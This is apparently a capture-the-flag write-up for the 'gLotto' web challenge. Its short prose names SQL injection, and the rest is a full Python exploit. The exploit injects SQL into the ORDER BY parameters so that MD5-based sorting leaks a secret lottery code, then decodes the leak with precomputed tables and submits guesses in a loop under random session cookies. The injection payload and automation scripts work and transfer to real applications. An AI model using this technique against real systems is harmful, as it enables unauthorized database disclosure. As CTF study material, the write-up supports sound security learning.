# gLootto

This challenge demands `LUCK`.

## Vulnerability

There is a sql injection.

## Exploit

by @RBTree_Pg_.

```python
import hashlib
import string
import pickle
import requests
import re
import os
import random


def randomString(stringLength=10):
        """Generate a random string of fixed length """
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(stringLength))

base_url = 'https://glotto.web.ctfcompetition.com/'

with open('march.pickle', 'rb') as f:
    march_dic = pickle.load(f)
with open('april.pickle', 'rb') as f:
    april_dic = pickle.load(f)
with open('may.pickle', 'rb') as f:
    may_dic = pickle.load(f)
with open('june.pickle', 'rb') as f:
    june_dic = pickle.load(f)

march = ['1WSNL48OLSAJ', 'UN683EI26G56', 'CA5G8VIB6UC9', '00HE2T21U15H', '01VJNN9RHJAC', 'I6I8UV5Q64L0', 'YYKCXJKAK3KV', 'D5VBHEDB9YGF']
april = ['4KYEC00RC5BZ', '7AET1KPGKUG4', 'UDT5LEWRSWM9', 'OQQRH90KDJH1', '2JTBMJW9HZOO', 'L4CY1JMRBEAW', '8DKYRPIO4QUW', 'BFWQCWYK9VHJ', '31OSKU57KV49']
may = ['O3QZ2P6JNSSA', 'PQ8ZW6TI1JH7', 'OWGVFW0XPLHE', 'OMZRJWA7WWBC', 'KRRNDWFFIB08', 'ZJR7ANXVBLEF', '8GAB09Z4Q88A']
june = ['1JJL716ATSCZ', 'YELDF36F4TW7', 'WXRJP8D4KKJQ', 'G0O9L3XPS3IR']

march_rev, april_rev, may_rev, june_rev = dict(), dict(), dict(), dict()
for idx, val in enumerate(march):
    march_rev[val] = idx
for idx, val in enumerate(april):
    april_rev[val] = idx
for idx, val in enumerate(may):
    may_rev[val] = idx
for idx, val in enumerate(june):
    june_rev[val] = idx

get_url = base_url
get_url += '?order0=date`%20and%201,MD5(concat(winner,%20substr(@lotto,1,4)))%23'
get_url += '&order1=date`%20and%201,MD5(concat(winner,%20substr(@lotto,5,4)))%23'
get_url += '&order2=date`%20and%201,MD5(concat(winner,%20substr(@lotto,9,3)))%23'
get_url += '&order3=date`%20and%201,MD5(concat(winner,%20substr(@lotto,12,1)))%23'

while True:
    session = 'junoxxx' + randomString(14)
    header = {
        'Cookie': 'PHPSESSID=' + session
    }
    r = requests.get(get_url, headers=header)

    lis = re.findall(r'[A-Z0-9]{12}', r.text)

    ans = ""

    s = ""
    for val in lis[:8]:
        s += format(march_rev[val], 'x')
    ans += march_dic[s]
    s = ""
    for val in lis[8:17]:
        s += format(april_rev[val], 'x')
    ans += april_dic[s]
    s = ""
    for val in lis[17:24]:
        s += format(may_rev[val], 'x')
    ans += may_dic[s]
    s = ""
    for val in lis[24:]:
        s += format(june_rev[val], 'x')
    ans += june_dic[s]

    os.system("python submit.py {} {} &".format(session, ans))
```

```python
import requests
import sys

session = sys.argv[1]
code = sys.argv[2]

header = {
    'Cookie': 'PHPSESSID=' + session
}

content = requests.post('https://glotto.web.ctfcompetition.com/', headers=header, data={'code':code}).text

with open('result.txt', 'ab') as f:
    f.write('expect: {}, actual: {}\n'.format(code, content))
    f.close()
```
